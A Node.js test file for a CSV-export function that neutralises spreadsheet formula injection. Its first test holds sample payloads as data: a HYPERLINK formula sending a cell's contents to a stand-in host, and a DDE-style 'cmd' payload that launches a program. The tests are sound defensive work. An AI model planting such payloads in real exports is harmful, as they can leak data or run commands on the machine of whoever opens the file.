import { test } from "node:test";
import assert from "node:assert/strict";
import { neutralizeFormula } from "../src/lib/csv-export.ts";

test("un texto que Excel tomaría por fórmula se queda en texto", () => {
  assert.equal(neutralizeFormula('=HYPERLINK("https://x/?d="&C2;"Ver")'), `'=HYPERLINK("https://x/?d="&C2;"Ver")`);
  assert.equal(neutralizeFormula("+34612345678"), "'+34612345678");
  assert.equal(neutralizeFormula("@SUMA(A1)"), "'@SUMA(A1)");
  assert.equal(neutralizeFormula("-2+3+cmd|' /C calc'!A0"), "'-2+3+cmd|' /C calc'!A0");
  assert.equal(neutralizeFormula("\tsoporte"), "'\tsoporte");
});

test("las cifras y los textos normales no se tocan", () => {
  assert.equal(neutralizeFormula("-12,5"), "-12,5");
  assert.equal(neutralizeFormula("-3 %"), "-3 %");
  assert.equal(neutralizeFormula("Laura Pérez"), "Laura Pérez");
  assert.equal(neutralizeFormula("600 123 456"), "600 123 456");
  assert.equal(neutralizeFormula(""), "");
});
